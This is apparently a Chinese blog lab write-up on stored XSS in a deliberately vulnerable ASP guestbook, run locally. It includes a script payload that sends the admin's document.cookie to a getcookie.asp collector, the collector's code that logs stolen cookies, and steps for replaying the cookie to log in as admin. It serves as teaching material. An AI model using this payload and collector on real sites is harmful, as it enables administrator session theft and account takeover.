---
layout: post

title: "渗透实验之一：浅析XSS攻击"

categories: WebSecurity

tags: XSS

---
###摘要
-------
XSS：跨站漏洞，一般出现在可以提交留言的地方，只要网站代码对提交内容过滤不严，都有可能出现跨站攻击。XSS的危害较大，一般表现形式为各种弹窗，可以扩展为广告推广的利器；还有一种表现形式为窃取管理员cookie，从而直接以管理员身份登录，做一些猥琐的事情。

案例概述：基于“逍遥留言版”进行测试（XP系统），默认管理员用户名和密码都是admin

案例详情：在本地配置好asp运行环境（本案例使用easyASPserver-v2.0），测试该留言本可以正常运行。详细实验步骤如下：

案例工具：easyASPserver-v2.0（简易asp服务器）； gbook（包含XSS漏洞的asp留言本程序）；HTMLViewer（cookie利用工具）；

**仅供学习之用，请勿用于非法用途，请君自重！**

###实验步骤
-----------

- 留言本概况如下图所示：右下角为管理员登陆链接
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image0.png)


- 点击上图的“发表留言”按钮，输入内容如下：`<script>alert("Hello XSS!")</script>`，即下图红框中内容，这段代码仅仅是测试该留言本是否有xss漏洞，无实意。填写完毕，点击“提交留言”即可。
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image1.png)

- 当管理员登陆后台进行留言管理审核的时候，可以发现提交的内容，当点击该内容时候弹出窗口，说明该系统存在xss漏洞。
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image2.png)
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image3.png)
以上操作步骤仅为测试，毫无实际意义。

==========当我们用其他payload替换`<script>alert("Hello XSS!")</script>`内容时效果如下=====

- 以游客身份继续发表留言，这次输入的payload内容为：`<script>document.location='http://127.0.0.1:88/getcookie.asp?msg='+document.cookie</script>`

- 解释：该段代码主要是为了调用getcookie.asp文件进行cookie捕获，一般在实战的时候，先编写getcookie.asp内容，将该文件上传至个人专属空间（支持asp即可），然后发表留言完毕，只要管理员打开提交的留言，其登陆的cookie将会直接根据getcookie.asp设置存储到个人空间中，为了便于演示，只在本地进行测试。

getcookie.asp代码内容如下（代码详解请见文后附录）：

{% highlight php %}
<%
thisfile=Server.MapPath("cookie.txt")
msg=Request("msg")
set fs=server.CreateObject("scripting.filesystemobject")
set thisfile=fs.OpenTextFile(thisfile,8,True,0)
thisfile.WriteLine("=======cookie:"&msg&"====Getcookies，Have fun！")
thisfile.close
set fs=nothing
%>
{% endhighlight %}

根据以上代码，可以发现，只要管理员点击带有xss攻击的链接，将会在攻击者个人空间生成cookie.txt文件，该文件主要负责存储窃取的cookies
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image4.png)

- 一切就绪，准备发表留言（注意红框里面内容）！
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image5.png)

- 管理员登陆：
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image6.png)

- 点击攻击者提交的内容，页面显示空白，注意此时浏览器的地址栏发生变化：
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image7.png)

- 此时前往个人空间查看，会发现生成cookie.txt文件：
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image8.png)

- 使用工具，利用窃取的cookie，按照下图输入，直接点击管理员登陆按钮，无需输入用户名和密码直接进入！ It works！
![](http://bravelee.u.qiniudn.com/Exercises1-About-XSS-Image9.png)

所有工具打包下载：[点击下载](http://pan.baidu.com/s/1pJ6Tlb1)


###附录
---------
'映射得到cookie.txt文件路径
thisfile=Server.MapPath("cookie.txt")

'得到请求参数msg值
msg=Request("msg")

'创建一个文件流对象
set fs=server.CreateObject("scripting.filesystemobject")

'追加方式打开文件，从文件尾部开始写入的内容 ;如果文件不存在就创建一个;以 ASCII 格式开启文件
set thisfile=fs.OpenTextFile(thisfile,8,True,0)

'向文件里面写数据
thisfile.WriteLine("=======cookie:"&msg&"======by brave")

'关闭文件流
thisfile.close

'释放文件件流
set fs=nothing